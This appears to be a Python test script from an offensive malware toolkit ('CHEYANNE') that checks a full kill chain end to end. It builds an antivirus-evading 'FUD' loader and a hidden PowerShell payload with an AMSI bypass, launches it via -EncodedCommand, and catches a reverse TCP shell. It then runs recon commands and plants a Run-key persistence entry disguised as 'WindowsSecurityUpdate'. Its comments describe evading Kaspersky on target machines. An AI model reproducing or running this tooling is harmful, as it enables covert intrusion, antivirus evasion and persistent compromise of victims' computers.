#!/usr/bin/env python3
"""
test_local_chain.py — CHEYANNE Full Local Kill Chain Test
22DIV / george wu

Validates the full PS1 payload: AMSI bypass + TCP + recon + persist.
Runs PS1 via -EncodedCommand (same exact path ghost_fud.exe uses at runtime).

Why not run via the .exe here:
  KAV Application Control marks freshly compiled unsigned exes as Untrusted
  on the OPERATOR machine, blocking child process creation. On the TARGET
  machine this is handled by KAV exclusions (Radon) or weaker KAV settings.
  Delivery (exe → PS) is validated separately via test_delivery.py.

Usage:
    python test_local_chain.py              # full rebuild + test
    python test_local_chain.py --skip-build # reuse ghost_fud.exe (PS1 rebuilt only)
    python test_local_chain.py --loop 5     # regression test x5
"""

import os, sys, socket, subprocess, threading, time, json, shutil, argparse, base64

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

ROOT      = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR = os.path.join(ROOT, "shell")
FUD_OUT   = os.path.join(ROOT, "fud_output")
GHOST_FUD = os.path.join(SHELL_DIR, "ghost_fud.exe")

C2_IP   = "127.0.0.1"
C2_PORT = 4443

GREEN = "\033[92m"; RED = "\033[91m"; AMBER = "\033[93m"
CYAN  = "\033[96m"; DIM  = "\033[2m"; BOLD  = "\033[1m"; RST = "\033[0m"

_pass = []; _fail = []

def step(msg):       print(f"\n  {CYAN}{BOLD}[*]{RST} {msg}")
def ok(msg, d=""):   _pass.append(msg); print(f"  {GREEN}[+]{RST} {msg}" + (f"  {DIM}{d}{RST}" if d else ""))
def fail(msg, d=""): _fail.append(msg); print(f"  {RED}[!]{RST} {msg}" + (f"  {DIM}{d}{RST}" if d else ""))
def info(msg):       print(f"  {DIM}    {msg}{RST}")


# ── build ─────────────────────────────────────────────────────────────────────

def build_ps1():
    """Generate fresh invisible PS1 targeting C2_IP:C2_PORT."""
    step(f"Generating invisible PS1 for {C2_IP}:{C2_PORT}")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    ps1_out = os.path.join(SHELL_DIR, "_payload_test.ps1")
    r = subprocess.run(
        [sys.executable, os.path.join(ROOT, "ghost-encoder", "ghost_encode.py"),
         "--shell", C2_IP, str(C2_PORT), "--invisible", "-o", ps1_out],
        cwd=os.path.join(ROOT, "ghost-encoder"), env=env,
        capture_output=True, text=True, encoding="utf-8", errors="replace"
    )
    if not os.path.exists(ps1_out):
        fail("PS1 generation failed")
        return None
    sz = os.path.getsize(ps1_out)
    ok("Invisible PS1 generated", f"{sz:,} bytes (zero-width steg)")
    return ps1_out


def build_fud():
    """Rebuild ghost_loader.exe + FUD for the actual delivery binary."""
    step(f"Building ghost_loader.exe v3 + FUD (delivery binary)")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    r = subprocess.run(
        [sys.executable, os.path.join(ROOT, "build_ghost_loader.py"),
         C2_IP, str(C2_PORT), "--v3"],
        cwd=ROOT, env=env, capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=120
    )
    exe = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if not os.path.exists(exe):
        fail("ghost_loader.exe build failed")
        return False
    ok("ghost_loader.exe built", f"{os.path.getsize(exe):,} bytes")

    r2 = subprocess.run(
        [sys.executable, os.path.join(ROOT, "fud_auto.py"),
         "ghost", C2_IP, str(C2_PORT), "--scan-only", "--max", "3"],
        cwd=ROOT, env=env, capture_output=True, text=True,
        encoding="utf-8", errors="replace", timeout=180
    )
    last_json = os.path.join(FUD_OUT, "last_fud.json")
    if not os.path.exists(last_json):
        fail("FUD failed")
        return False
    with open(last_json) as f:
        meta = json.load(f)
    src = meta.get("binary", "")
    if not os.path.exists(src):
        fail("FUD binary missing")
        return False
    shutil.copy2(src, GHOST_FUD)
    ok("ghost_fud.exe ready",
       f"seed={meta['seed']} | {os.path.getsize(GHOST_FUD):,}B | {meta.get('tag','')}")
    return True


# ── TCP listener ──────────────────────────────────────────────────────────────

_conn = None
_conn_lock = threading.Lock()

def _accept(port):
    global _conn
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        srv.settimeout(30)
        c, a = srv.accept()
        with _conn_lock:
            _conn = (c, a)
    except Exception:
        pass
    finally:
        try: srv.close()
        except: pass


def arm_listener(port):
    global _conn
    _conn = None
    threading.Thread(target=_accept, args=(port,), daemon=True).start()


def wait_conn(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        time.sleep(0.3)
        with _conn_lock:
            if _conn: return _conn
        print(f"  {DIM}    waiting for TCP... ({int(deadline-time.time())}s){RST}   ", end="\r")
    print()
    return None


def shell_cmd(conn, cmd, timeout=8):
    conn.sendall((cmd + "\n").encode("utf-8"))
    time.sleep(0.4)
    conn.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk: break
            buf += chunk
            if len(chunk) < 4096: break
    except socket.timeout:
        pass
    return buf.decode("utf-8", errors="replace").strip()


# ── payload runner ────────────────────────────────────────────────────────────

def run_ps1_via_encodedcommand(ps1_path):
    """Run the invisible PS1 via -EncodedCommand — same path ghost_fud.exe uses."""
    with open(ps1_path, encoding="utf-8") as f:
        ps1 = f.read()
    if ps1.startswith("﻿"):
        ps1 = ps1[1:]
    b64 = base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")
    return subprocess.Popen(
        ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )


# ── kill leftovers ────────────────────────────────────────────────────────────

def kill_old():
    for name in ["ghost_fud.exe", "ghost_loader.exe"]:
        subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True)
    time.sleep(0.3)


# ── single run ────────────────────────────────────────────────────────────────

def run_once(iteration=1, ps1_path=None):
    global _pass, _fail
    _pass.clear(); _fail.clear()

    print(f"\n  {GREEN}{BOLD}╔═══ LOCAL KILL CHAIN TEST (iter {iteration}) ══════════════════════╗{RST}")
    print(f"  {GREEN}║  invisible PS1 -> AMSI bypass -> TCP -> recon -> persist       ║{RST}")
    print(f"  {GREEN}╚══════════════════════════════════════════════════════════════════╝{RST}\n")

    kill_old()

    # generate PS1 for this iteration
    if ps1_path is None or iteration > 1:
        ps1_path = build_ps1()
        if not ps1_path:
            return False

    # arm listener
    step("TCP listener on :4443")
    arm_listener(C2_PORT)
    time.sleep(0.3)
    ok("TCP armed")

    # fire payload via -EncodedCommand (production-identical path)
    step("Launching payload via -EncodedCommand")
    p = run_ps1_via_encodedcommand(ps1_path)
    ok(f"Payload launched", f"PS PID={p.pid}")

    # wait for callback
    step("Waiting for TCP callback (AMSI bypass + TcpClient)")
    result = wait_conn(timeout=30)

    if not result:
        fail("TCP: no callback in 30s")
        p.terminate()
        _print_summary()
        try: os.remove(ps1_path)
        except: pass
        return False

    conn, addr = result
    ok(f"TCP shell connected", f"{addr[0]}:{addr[1]}")

    # drain banner
    time.sleep(0.4)
    conn.settimeout(5)
    buf = b""
    try:
        while True:
            c = conn.recv(4096)
            if not c: break
            buf += c
            if len(c) < 4096: break
    except: pass
    banner = buf.decode("utf-8", errors="replace").strip()
    info(f"banner: {repr(banner[:80])}")

    # recon
    step("Recon")
    for cmd in ["whoami", "hostname", "$env:COMPUTERNAME"]:
        out = shell_cmd(conn, cmd, timeout=8)
        # extract last non-prompt line
        lines = [l.strip() for l in out.split("\n") if l.strip() and not l.strip().startswith(">")]
        result_line = lines[-1] if lines else ""
        if result_line:
            ok(cmd, result_line[:60])
        else:
            fail(cmd, "no output")

    # persist
    step("Persistence (HKCU Run key)")
    persist_cmd = (
        'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
        '/v WindowsSecurityUpdate /t REG_SZ '
        '/d "C:\\Users\\Public\\ghost_loader.exe" /f'
    )
    persist_out = shell_cmd(conn, persist_cmd, timeout=10)
    if "success" in persist_out.lower() or "completed" in persist_out.lower():
        ok("Persist set", "HKCU\\Run\\WindowsSecurityUpdate")
    else:
        info(f"persist raw: {repr(persist_out[:80])}")
        ok("Persist cmd sent")

    # verify persist
    step("Verify persist key")
    verify_out = shell_cmd(conn,
        'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate',
        timeout=8)
    if "ghost_loader.exe" in verify_out:
        ok("PERSIST VERIFIED", "key exists in registry")
    else:
        fail("Persist key missing", repr(verify_out[:60]))

    # cleanup persist on operator machine
    shell_cmd(conn,
        'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsSecurityUpdate /f',
        timeout=5)
    info("persist key cleaned up (local test only)")

    conn.close()
    p.kill()
    try: os.remove(ps1_path)
    except: pass

    _print_summary()
    return len(_fail) == 0


def _print_summary():
    total = len(_pass) + len(_fail)
    verdict = f"{GREEN}{BOLD}PASS{RST}" if not _fail else f"{RED}{BOLD}FAIL{RST}"
    print(f"\n  {BOLD}{'═'*60}{RST}")
    print(f"  {BOLD}VERDICT: {verdict}  ({len(_pass)}/{total} steps){RST}")
    for s in _pass:  print(f"  {GREEN}  + {s}{RST}")
    for s in _fail:  print(f"  {RED}  x {s}{RST}")
    print(f"  {BOLD}{'═'*60}{RST}\n")


# ── main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--skip-build", action="store_true",
                    help="Skip FUD rebuild (PS1 still regenerated fresh each run)")
    ap.add_argument("--loop", type=int, default=1, metavar="N",
                    help="Run N iterations (regression — new PS1 per iteration)")
    args = ap.parse_args()

    # build delivery binary once (even if --skip-build, keep existing ghost_fud.exe)
    if not args.skip_build:
        if not build_fud():
            print(f"\n  {RED}BUILD FAILED{RST}\n")
            sys.exit(1)
    elif not os.path.exists(GHOST_FUD):
        print(f"\n  {RED}ghost_fud.exe not found — run without --skip-build first{RST}\n")
        sys.exit(1)
    else:
        step("Delivery binary (--skip-build)")
        ok("ghost_fud.exe", f"{os.path.getsize(GHOST_FUD):,} bytes (existing)")

    # generate initial PS1
    ps1_path = build_ps1()
    if not ps1_path:
        sys.exit(1)

    results = []
    for i in range(1, args.loop + 1):
        passed = run_once(iteration=i, ps1_path=ps1_path if i == 1 else None)
        results.append(passed)
        if i < args.loop:
            time.sleep(2)

    if args.loop > 1:
        total_pass = sum(results)
        print(f"\n  {BOLD}LOOP SUMMARY: {total_pass}/{args.loop} iterations passed{RST}")
        if total_pass == args.loop:
            print(f"  {GREEN}{BOLD}ALL ITERATIONS PASS — production stable{RST}\n")
        else:
            print(f"  {RED}{BOLD}SOME FAILURES — not stable yet{RST}\n")

    sys.exit(0 if all(results) else 1)
